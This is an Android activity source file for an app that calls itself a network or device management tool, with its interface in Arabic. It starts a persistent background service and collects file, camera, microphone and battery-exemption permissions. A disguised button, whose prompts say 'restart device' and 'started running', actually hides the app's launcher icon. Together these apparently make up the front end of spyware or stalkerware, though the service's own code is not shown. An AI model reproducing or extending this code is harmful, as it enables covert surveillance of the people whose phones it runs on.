package com.stonx.manager;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ_PERMS = 101;
    private LinearLayout mStatusLayout;
    private Button mBtnPerms, mBtnHide;
    private int mPermStep = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(buildUI());
        startStonxService();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updatePermsUI();
        updateHideBtn();
        if (mPermStep != 0) { mPermStep = nextStep(); doStep(); }
    }

    private ComponentName alias() {
        return new ComponentName(getPackageName(), getPackageName() + ".MainActivityAlias");
    }

    private boolean isVisible() {
        return getPackageManager().getComponentEnabledSetting(alias())
               != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void onHidePressed() {
        if (isVisible()) {
            new AlertDialog.Builder(this)
                .setTitle("بدأ التشغيل")
                .setMessage(".")
                .setPositiveButton("أعد تشغيل الجهاز", (d, w) -> {
                    getPackageManager().setComponentEnabledSetting(
                        alias(),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                    Toast.makeText(this, "جاري التشغيل", Toast.LENGTH_LONG).show();
                    new Handler(Looper.getMainLooper()).postDelayed(this::finish, 1500);
                })
                .setNegativeButton("إلغاء", null).show();
        } else {
            getPackageManager().setComponentEnabledSetting(
                alias(),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            Toast.makeText(this, "ظهرت الأيقونة ✓", Toast.LENGTH_SHORT).show();
            updateHideBtn();
        }
    }

    private void updateHideBtn() {
        if (mBtnHide == null) return;
        mBtnHide.setText(isVisible() ? "بدأ التشغيل" : "إيقاف التشغيل");
        mBtnHide.setBackgroundColor(isVisible() ? 0xFF37474F : 0xFF6A1B9A);
    }

    private View buildUI() {
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(0xFFFFFFFF);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(20), dp(28), dp(20), dp(20));
        sv.addView(root, new LinearLayout.LayoutParams(-1, -1));

        root.addView(tv("إدارة الشبكة", 22, 0xFF111111, true), ww());
        root.addView(mg(tv("v1.0.0 — نظام إدارة الجهاز", 13, 0xFF888888, false), 0, dp(4), 0, dp(24)));
        root.addView(tv("الصلاحيات المطلوبة", 15, 0xFF333333, true), ww());

        mStatusLayout = new LinearLayout(this);
        mStatusLayout.setOrientation(LinearLayout.VERTICAL);
        root.addView(mg(mStatusLayout, 0, dp(10), 0, dp(24)));

        mBtnPerms = btn("طلب الصلاحيات", 0xFF1565C0);
        mBtnPerms.setOnClickListener(v -> { mPermStep = nextStep(); doStep(); });
        root.addView(mg(mBtnPerms, 0, 0, 0, dp(16)));

        View sep = new View(this);
        sep.setBackgroundColor(0xFFEEEEEE);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(-1, dp(1));
        sp.setMargins(0, 0, 0, dp(16));
        root.addView(sep, sp);

        mBtnHide = btn("بدأ التشغيل", 0xFF37474F);
        mBtnHide.setOnClickListener(v -> onHidePressed());
        root.addView(mBtnHide, ww());

        root.addView(mg(tv(".",
                11, 0xFF999999, false), 0, dp(6), 0, 0));
        return sv;
    }

    private void updatePermsUI() {
        if (mStatusLayout == null) return;
        mStatusLayout.removeAllViews();
        boolean all = true;
        for (PermRow r : permRows()) {
            if (!r.ok) all = false;
            LinearLayout row = new LinearLayout(this);
            row.setOrientation(LinearLayout.HORIZONTAL);
            LinearLayout.LayoutParams rp = ww(); rp.setMargins(0, 0, 0, dp(6));
            row.setLayoutParams(rp);
            row.addView(tv(r.ok ? "✓  " : "✗  ", 14, r.ok ? 0xFF2E7D32 : 0xFFB71C1C, true));
            row.addView(tv(r.label, 14, 0xFF333333, false));
            mStatusLayout.addView(row);
        }
        if (mBtnPerms != null) {
            mBtnPerms.setText(all ? "✓  جميع الصلاحيات ممنوحة" : "طلب الصلاحيات");
            mBtnPerms.setBackgroundColor(all ? 0xFF2E7D32 : 0xFF1565C0);
            mBtnPerms.setEnabled(!all);
        }
    }

    private static class PermRow { String label; boolean ok; PermRow(String l, boolean o) { label=l; ok=o; } }

    private List<PermRow> permRows() {
        List<PermRow> list = new ArrayList<>();
        boolean storage = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
                ? android.os.Environment.isExternalStorageManager()
                : checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        list.add(new PermRow("الوصول إلى الملفات", storage));
        list.add(new PermRow("الكاميرا", checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED));
        list.add(new PermRow("الميكروفون", checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED));
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            list.add(new PermRow("الإشعارات", checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED));
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        list.add(new PermRow("تجاهل تحسينات البطارية", pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())));
        return list;
    }

    private int nextStep() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) return 1;
        if (!missingRuntime().isEmpty()) return 2;
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) return 3;
        return 0;
    }

    private void doStep() {
        switch (mPermStep) {
            case 1: startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()))); break;
            case 2: List<String> rt = missingRuntime(); if (!rt.isEmpty()) requestPermissions(rt.toArray(new String[0]), REQ_PERMS); break;
            case 3: startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName()))); break;
            default: updatePermsUI();
        }
    }

    private List<String> missingRuntime() {
        List<String> list = new ArrayList<>();
        for (String p : new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO})
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) list.add(p);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
            list.add(Manifest.permission.POST_NOTIFICATIONS);
        return list;
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] results) {
        super.onRequestPermissionsResult(req, perms, results);
        if (req == REQ_PERMS) { mPermStep = nextStep(); doStep(); }
    }

    private void startStonxService() {
        Intent svc = new Intent(this, StonxService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);
    }

    private Button btn(String t, int bg) { Button b = new Button(this); b.setText(t); b.setTextColor(0xFFFFFFFF); b.setBackgroundColor(bg); b.setAllCaps(false); b.setTextSize(15); return b; }
    private TextView tv(String t, int s, int c, boolean b) { TextView v = new TextView(this); v.setText(t); v.setTextSize(s); v.setTextColor(c); if (b) v.setTypeface(null, android.graphics.Typeface.BOLD); return v; }
    private View mg(View v, int l, int t, int r, int b) { LinearLayout.LayoutParams p = ww(); p.setMargins(l,t,r,b); v.setLayoutParams(p); return v; }
    private LinearLayout.LayoutParams ww() { return new LinearLayout.LayoutParams(-2, -2) {{ width = ViewGroup.LayoutParams.MATCH_PARENT; }}; }
    private int dp(int v) { return Math.round(v * getResources().getDisplayMetrics().density); }
}
